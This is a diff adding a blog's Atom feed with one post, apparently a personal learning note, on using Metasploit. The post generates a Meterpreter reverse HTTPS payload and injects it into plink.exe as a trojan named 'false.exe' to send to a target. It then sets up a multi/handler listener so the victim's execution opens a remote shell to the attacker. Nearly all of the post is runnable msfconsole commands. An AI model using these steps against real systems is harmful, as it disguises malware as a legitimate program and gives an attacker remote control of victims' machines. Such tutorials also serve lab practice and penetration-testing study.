@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Metasploit Generates Payload]]></title>
+    <link href="http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload/"/>
+    <updated>2016-02-26T15:47:27-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload</id>
+    <content type="html"><![CDATA[<h3>This note is for generating payload using Metasploit.</h3>
+
+<h3>Use <code>generate</code> command:</h3>
+
+<pre><code>msf &gt; use payload/windows/meterpreter/reverse_https
+
+msf payload(reverse_https) &gt; set lhost 192.168.79.156
+
+msf payload(reverse_https) &gt; set lport 4444
+
+msf payload(reverse_https) &gt; generate -t exe -f false.exe -x /var/www/html/plink.exe
+</code></pre>
+
+<!--more-->
+
+
+<p>Here I use reverse_https to generate payload and inject to plink.exe as a template.</p>
+
+<p>options:</p>
+
+<p><code>-t  ------ payload format</code></p>
+
+<p><code>-f  ------ payload output</code></p>
+
+<p><code>-x  ------ injection template</code></p>
+
+<p>This step will generate reverse https payload and use plink.exe as a template, write to file false.exe and send it to the target.</p>
+
+<p>In order to get the reverse https shell, I have to set up multi handler:</p>
+
+<h3>Set up <code>multi handler</code></h3>
+
+<pre><code>msf &gt; use exploit/multi/handler 
+
+msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
+
+msf exploit(handler) &gt; set lhost 192.168.79.156
+
+msf exploit(handler) &gt; set lport 4444
+
+msf exploit(handler) &gt; exploit 
+</code></pre>
+
+<p>Once the victim run the false.exe on the target machine, it will initlize a reverse https connection to the attacker.</p>
+
+<p><img src="/images/blog/metasplot_payload/metasploit_payload_1.JPG" title="[title text [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+</feed>
